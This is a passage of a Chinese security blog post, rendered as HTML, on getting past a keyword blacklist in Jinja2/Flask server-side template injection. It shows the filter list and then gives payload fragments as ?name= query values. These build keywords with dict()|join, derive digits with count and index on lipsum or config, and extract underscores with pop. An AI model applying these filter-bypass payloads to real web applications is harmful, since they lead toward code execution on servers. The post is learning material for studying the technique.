class="string">r&#x27;,&#x27;</span>get_flashed_messages<span class="string">&#x27;,&#x27;</span>config<span class="string">&#x27;,&#x27;</span>request<span class="string">&#x27;,&lt;/br&gt;   </span></span><br><span class="line"><span class="string">&#x27;</span>count<span class="string">&#x27;,&#x27;</span>length<span class="string">&#x27;,&#x27;</span>０<span class="string">&#x27;,&#x27;</span>１<span class="string">&#x27;,&#x27;</span>２<span class="string">&#x27;,&#x27;</span>３<span class="string">&#x27;,&#x27;</span>４<span class="string">&#x27;,&#x27;</span>５<span class="string">&#x27;,&#x27;</span>６<span class="string">&#x27;,&#x27;</span>７<span class="string">&#x27;,&#x27;</span>８<span class="string">&#x27;,&#x27;</span>９<span class="string">&#x27;,&#x27;</span><span class="number">0</span><span class="string">&#x27;,&#x27;</span><span class="number">1</span><span class="string">&#x27;,&#x27;</span><span class="number">2</span><span class="string">&#x27;,&#x27;</span><span class="number">3</span><span class="string">&#x27;,&#x27;</span><span class="number">4</span><span class="string">&#x27;,&#x27;</span><span class="number">5</span><span class="string">&#x27;,&#x27;</span><span class="number">6</span><span class="string">&#x27;,&#x27;</span><span class="number">7</span><span class="string">&#x27;,&#x27;</span><span class="number">8</span><span class="string">&#x27;,&#x27;</span><span class="number">9</span><span class="string">&#x27;&lt;/br&gt;    </span></span><br><span class="line"><span class="string">&lt;/br&gt;  </span></span><br></pre></td></tr></table></figure>
+
+<p>很多可用的都过滤了，数字这里把半角和全角都给过滤了，但当时测试的时候发现unicode可以绕过去的。</p>
+<p>用最直接的拼接也不行 “cla””ss” ，因为 引号和+ 都被过滤。但是这里依然可以凑出来我们想要的。</p>
+<p>这里 <code>| 、join 、()、dict</code>  都没被过滤，我们可以利用这个来凑合拼接</p>
+<p>比如<code>&#123;% set glo=dict(glo=a,bals=a) | join %&#125;</code>    就可以凑出 <code>变量glo=globals</code>    ，这个是拼接的关键，我把它单独拿出来分析：</p>
+<p>我在本地py环境进行测试的时候发现：</p>
+<p>直接dict(glo&#x3D;a,bals&#x3D;a) 是会报错的：</p>
+<p><img src="https://i.loli.net/2021/04/09/2gol73Ta9LbtiCh.png" alt="ssti1.png"></p>
+<p>但是我flask  jinjia2 环境下，是不会报错，而是返回键值对应为空</p>
+<p><img src="https://i.loli.net/2021/04/09/Il1CjPnSuMOFe8K.png" alt="ssti2.png"></p>
+<p>本来如果这个地方为 <code>dict(glo=1,bals=2)</code>  经过join之后，也是 globals ，这里是直接对key进行了拼接。只要 <code>set &#123;% %&#125; | () join</code> 等没被过滤，我们就可以利用拼接，拼接出所有我们想要的。</p>
+<p>所以最后的问题归结到，你如何去凑？如何去获取有些字符？比如这里把数字过滤了，你怎么去拿到数字？有时候我们可以利用内置的一些变量去拿字符，比如 <code>config lipsum</code> 等等。</p>
+<p>我们可以利用count () &#x2F;&#x2F;length 别名 来凑数字:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set c=e|count %&#125;&#123;&#123;c&#125;&#125;  //此时c为0</span><br><span class="line">&#123;% set cc=dict(ee=a)|join|count %&#125; //此时为1</span><br><span class="line">&#123;% set ccc=dict(eee=a)|join|count %&#125; //此时为2</span><br><span class="line">..... 就以此类推。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>我们也可以这样去拿数字<code>?name=&#123;&#123;(config.__str__().index('f'))&#125;&#125;</code>   这里先是把config转换成字符串，然后去获取f对应的下标，也可以用过滤器 <code>?name=&#123;&#123;(config|string|list).index('f')&#125;&#125;</code> 经过测试这里的list 不用加也行，不用转换成列表也可以拿下标。</p>
+<p>当然<code>?name=&#123;&#123;lipsum.__str__().index('f')&#125;&#125;</code>  以及 <code>?name=&#123;&#123;(lipsum|string|list).index('f')&#125;&#125;</code>  也是一样的。当然这里引号被过滤了，但是问题不大，我们可以这样：</p>
+<p><code>?name=&#123;% set ff=dict(f=a) | join %&#125;&#123;&#123;(lipsum|string|list).index(ff)&#125;&#125;</code>  我们凑出ff变量，值为f 。虽然这里点也被过滤了，但是问题依然不大，我们可以 <code>?name=&#123;% set ff=dict(f=a)|join %&#125;&#123;&#123;lipsum|string|list|attr(index)(ff)&#125;&#125;</code>  当然这里index 也被过滤了，但是我们同样可以利用上面的方法来凑。</p>
+<p>利用这个思路我们能拿到部分数字，然后再去利用这些数字去“衍生” 出更多数字，比如:</p>
+<p><code>?name=&#123;% set three=3 %&#125;&#123;% set nine=three*three %&#125;&#123;&#123;nine&#125;&#125;</code>  这个时候会发现 nine的值就是9了。所以我们凑出几个数字，就可以利用这几个数字进行一个运算，来套娃获得我们想要的数字。</p>
+<p>然后就是怎么获取下划线了：</p>
+<p>可以利用 list 中的 pop 方法 </p>
+<p><code>?name=&#123;&#123;lipsum|string|list|attr('pop')(18)&#125;&#125;</code>  获取到下划线。</p>
+<p>所以到现在基本上可以凑出所有我们想要的命令了。</p>
+<p>对以上提到的梳理一下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set glo=dict(glo=a,bals=a)|join %&#125;   //凑关键字，此时 glo 变量的值为 globals</span><br><span class="line">&#123;% set num=lipsum|string|list|attr(ind)(ff) %&#125; //凑数字，这里的 ind 提前得凑出来index ，后面的 ff 也提前得凑出来</span><br><span class="line">这里也可以用config 或者其他变量。</span><br><span class="line">&#123;% set zero=e|count %&#125;  //凑0 </span><br><span class="line">&#123;% set one=dict(e=a)|join|count %&#125; //凑1</span><br><span class="line">&#123;% set char=lipsum|string|list|attr(po)(num) %&#125; //凑字符，比如下划线啥的，这里的po得凑出来为pop，num也是提前凑好的</span><br><span class="line">然后剩下的就是拼接出payload了。</span><br></pre></td></tr></table></figure>
+
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>在SSTI学习中，发现很多问题都是围绕着构造和绕过，构造方式千变万化，但是思想是一致的，就是利用已有的东西去创造想要的，用已有的东西去替换想要的，方法也不局限这些，比如上面我在凑字符的时候，用到了 <code>config 、lipsum </code>  那下次如果被过滤了，是否有其他内置的可以利用的变量？ 还有一些获取下标和获取数字的方法也不是局限的。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/python-ssti/" rel="tag"># python-ssti</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/04/01/nodejs%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/" rel="prev" title="nodejs常见漏洞小结">
+                  <i class="fa fa-angle-left"></i> nodejs常见漏洞小结
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/04/11/CTF%E4%B8%ADpython%E9%97%AE%E9%A2%98%E4%B9%8Bpin%E7%A0%81/" rel="next" title="CTF中python问题之pin码">
+                  CTF中python问题之pin码 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">My0n9s</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
